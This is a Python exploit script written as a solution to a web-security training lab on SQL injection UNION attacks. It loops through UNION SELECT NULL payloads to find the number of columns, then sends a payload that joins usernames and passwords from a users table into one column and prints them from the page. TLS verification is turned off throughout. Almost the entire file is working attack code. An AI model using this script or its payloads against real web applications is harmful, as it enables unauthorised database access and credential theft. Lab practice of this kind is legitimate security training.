# Lab: SQL injection UNION attack, retrieving multiple values in a single column

import requests
import re
import sys
import bs4
from requests.utils import requote_uri
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

target_url = "https://0a1e008a049f6570c0b3778b00710025.web-security-academy.net"

r = requests.Session()
proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

def sql_injection_find_columns():
    url = target_url + "/filter?category="

    payloads = []
    for i in range(2,10):
        payload = "Pets'+UNION+SELECT+NULL"
        for j in range(1,i):
            payload += ",NULL"
        payload += "--"
        payloads.append(payload)

    
    final_payload = ""
    for payload in payloads:
        malicious_url = requote_uri(url + payload)
        out = r.get(malicious_url, verify = False, proxies = proxies)
        if out.status_code == 200:
            print("[+] Exploited ")
            print("Payload: ", payload)
            print("Exploit URL: ", malicious_url)
            final_payload = payload
            break
    
    return final_payload

def sql_injection_get_data():
    
    payload = "Pets'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"

    url = target_url + "/filter?category=" + payload
    url = requote_uri(url)

    out = r.get(url, proxies = proxies, verify = False)
    if out.status_code == 200:
        soup = bs4.BeautifulSoup(out.text, features="html.parser")
        data = soup.findAll('th')
        print(data)
        for th in data:
            print(th)

payload = sql_injection_find_columns()
sql_injection_get_data()